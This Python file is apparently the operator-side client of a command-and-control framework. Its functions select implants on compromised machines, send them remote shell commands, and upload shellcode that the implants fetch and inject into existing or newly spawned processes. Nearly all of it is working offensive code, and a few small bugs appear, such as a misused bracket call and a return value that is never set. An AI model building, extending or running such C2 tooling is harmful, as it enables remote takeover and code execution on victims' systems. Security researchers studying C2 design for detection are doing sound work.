import requests
from os.path import isfile
import subprocess
from rich.text import Text
from typing import List
from . import client_globals
from . import client_errors
from . import server_codes
from . import storage
from . import encryption
from os import _exit, system
from datetime import datetime

### This is the file that descibes the functions that handle client commands

# Helper function to check if the client is currently selected an implant
def connected_to_implant() -> bool:
    if client_globals.instance_db.selected_implant == "":
        return False
    return True

# Helper function to update the global implant_db
def update_implant_db():
    url = "/admin/update/implants"
    server = client_globals.instance_db.server
    port = client_globals.instance_db.port

    # Send the request and assign the response to the global implant db 
    client_globals.instance_db.implant_db = requests.get(f"{server}:{port}{url}").json()["implant_db"]


# Helper function that prints a success message for implant commands
def print_success(cmd_id: str, args: List[str], app):
    app.get_child_by_id("command_output").print(Text().assemble("The command \'", (' '.join(args), "bold"), "\' with ID \'", (cmd_id, "bold"), "\' was successfully sent to implant \'", (client_globals.instance_db.selected_implant, "bold"), "\'."))


# Helper function that sends just a text command
def post_command(cmd_str: str, cmd_type: storage.CMD_TYPE, cmd_id: str):
    
    x_headers = {
                "X-Operator-Name": client_globals.instance_db.operator_name,
                "X-Implant-Name": client_globals.instance_db.selected_implant,
                "X-Command-Type": cmd_type.value,
                "X-Command-Id": cmd_id,
    }
    
    url = "/admin/management"

    cmd_struct = {"cmd_str": cmd_str}

    requests.post(client_globals.instance_db.server+
                         ":"+
                         client_globals.instance_db.port+
                         url,
                         headers=x_headers,
                         data=cmd_struct
                         )
    return

# Helper function that sends a file to the server as well as a command
def post_file_command(file_path: str, file_id: str, cmd_str: str, cmd_type: storage.CMD_TYPE, cmd_id: str):
    # Check if file exists, error if not
    if not isfile(file_path):
        raise client_errors.FileDoesntExist

    # Build the request
    x_headers = {
                "X-Operator-Name": client_globals.instance_db.operator_name,
                "X-Implant-Name": client_globals.instance_db.selected_implant,
                "X-Command-Type": cmd_type.value,
                "X-Command-Id": cmd_id,
    }
    
    url = "/admin/management"

    cmd_struct = {'cmd_str': cmd_str}

    with open(file_path, "rb") as f:
        # Send a request to the server with metadata for storage in headers,
        # command string in the body, and attach the file as well
        file_data = f.read()
        requests.post(client_globals.instance_db.server+
                             ":"+
                             client_globals.instance_db.port+
                             url,
                             headers=x_headers,
                             data=cmd_struct,
                             files={'cmd_file': (file_id, file_data)}
                            )

# Command that selects an implant
def cmd_select(args: List[str], app):
    # Check for the length of args and raise appropriate exception
    client_errors.arg_len_error(args, max=2, min=2)

    # Need to query the server to make sure the implant_db is updated
    update_implant_db()

    # Now make sure that the selected implant exists
    if args[1] not in client_globals.instance_db.implant_db:
        raise client_errors.ImplantDoesntExist

    # Update the global selected implant
    client_globals.instance_db.selected_implant = args[1]

    # Update the border of command_output
    app.get_child_by_id("command_output").border_title = f"Command Output - Connected to {args[1]}"

    # Print a success message to the command Output
    app.get_child_by_id("command_output").print(Text().assemble("Successfully connected to implant \'", (args[1], "bold"), "\'."))

    return

# Command that sends a shell command to the server for an implant
def cmd_shell(args: List[str], app):
    # Error if not connected to an implant
    if not connected_to_implant():
        raise client_errors.NotConnectedToImplant
    # Error if there are no other args provided
    client_errors.arg_len_error(args, min=2, max=1000)

    # Get an ID for the command
    id = encryption.id_generator(N=32)

    # The params to serialize should just be one string, not each part of the command
    # separated by ::: delimiter
    shell_str = [' '.join(args[1:])]

    # Serialize the command
    cmd_str = storage.create_command_str(id, storage.CMD_TYPE.CMD_SHELL, shell_str)  

    # Send the cmd_str
    post_command(cmd_str, storage.CMD_TYPE.CMD_SHELL, id)

    # Print the implant message success to screen
    print_success(id, args, app)

    return

# Command that sends a shellcode file to the server as well as a command
# The command is read first, and tells the implant where to pull the 
# shellcode file from on the server, reads it into memory, and executes
def cmd_shellcode_inject(args: List[str], app):
    # Must be 2 args
    client_errors.arg_len_error(args, 2, 2)

    # Create a file id for the file to be saved
    file_id = encryption.id_generator(N=32)

    # Create a command id
    cmd_id = encryption.id_generator(N=32)

    # Create the command string
    cmd_str = storage.create_command_str(cmd_id, storage.CMD_TYPE.CMD_SHELLCODE_INJECT, [file_id]) 

    # Post the file, if it doesn't exist, will raise FileDoesntExist exception
    uploaded_filename = post_file_command(file_path=args[1],
                                          file_id=file_id,
                                          cmd_id=cmd_id,
                                          cmd_type=storage.CMD_TYPE.CMD_SHELLCODE_INJECT,
                                          cmd_str=cmd_str
                                          )
    
    # Check for server error on the return, raise a UploadFailure
    if uploaded_filename == server_codes.ServerErrors.ERR_UPLOAD_EXCEPTION.value:
        raise client_errors.UploadFailure 
    
    print_success(cmd_id=cmd_id, args=args, app=app)
    return
# Different method of shellcode injection, this creates a process and injects it
# into it, same client -> server -> implant transfer method as shellcode_inject
def cmd_shellcode_spawn(args: List[str], app):
    # Must be 2 args
    client_errors.arg_len_error(args, 2, 2)

    # Create a file id for the file to be saved
    file_id = encryption.id_generator(N=32)

    # Create a command id
    cmd_id = encryption.id_generator(N=32)

    # Create the command string
    cmd_str = storage.create_command_str(cmd_id, storage.CMD_TYPE.CMD_SHELLCODE_SPAWN, [file_id]) 

    # Post the file, if it doesn't exist, will raise FileDoesntExist exception
    uploaded_filename = post_file_command(file_path=args[1],
                                          file_id=file_id,
                                          cmd_id=cmd_id,
                                          cmd_type=storage.CMD_TYPE.CMD_SHELLCODE_SPAWN,
                                          cmd_str=cmd_str
                                          )
    
    # Check for server error on the return, raise a UploadFailure
    if uploaded_filename == server_codes.ServerErrors.ERR_UPLOAD_EXCEPTION.value:
        raise client_errors.UploadFailure 
    
    print_success(cmd_id=cmd_id, args=args, app=app)
    return

# All associated server commands
def cmd_server(args: List[str], app):
    # Check for at least 2 args initially
    client_errors.arg_len_error(args, max=1000, min=2)

    # Match on the second word
    match args[1]:
        # server info 
        case "info":
            # Must be 2 args long
            client_errors.arg_len_error(args, max=2, min=2)
            # Print the server info to the command output
            app.get_child_by_id["command_output"].print(Text().assemble("Currently connected to ", (client_globals.instance_db.server, "bold"), " on port ", (client_globals.instance_db.port, "bold"), " as \'", (client_globals.instance_db.operator_name, "bold"), "\'."))
        case _:
            raise client_errors.CommandDoesntExist

    return

# Executes shell commands in the currently selected terminal and displays 
# stdout and stderr in the command_output window
def cmd_terminal_passthrough(args: List[str], app):
    # Error if less than 2 args
    client_errors.arg_len_error(args=args, max=1000, min=2)
    # Now use subproccess to call it, taking the [1] - [last] element of args
    result = subprocess.run(args[1:], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)

    # If error
    if result.returncode != 0:
        to_print = Text().assemble(f"The terminal command \'", (' '.join(args[1:]), "bold"), f"\' errored out:\n{result.stderr}")
        app.get_child_by_id("command_output").err_generic(to_print)
    else:
        to_print = Text().assemble(f"Terminal output of \'", (' '.join(args[1:]), "bold"), f"\':\n{result.stdout}")
        app.get_child_by_id("command_output").print(to_print)

# Exits the client, the suplimentary args should be empty
def cmd_exit(args: List[str], app):
    # Exit the TUI
    app.exit("0")
    system("reset")
    _exit(0)

# Here is the dict of supported commands 
CMD_TABLE = {
                "server": cmd_server,
                "exit": cmd_exit,
                "select": cmd_select,
                "shell": cmd_shell,
                "shellcode-inject": cmd_shellcode_inject,
                "shellcode-spawn": cmd_shellcode_spawn,
                "!": cmd_terminal_passthrough,
}

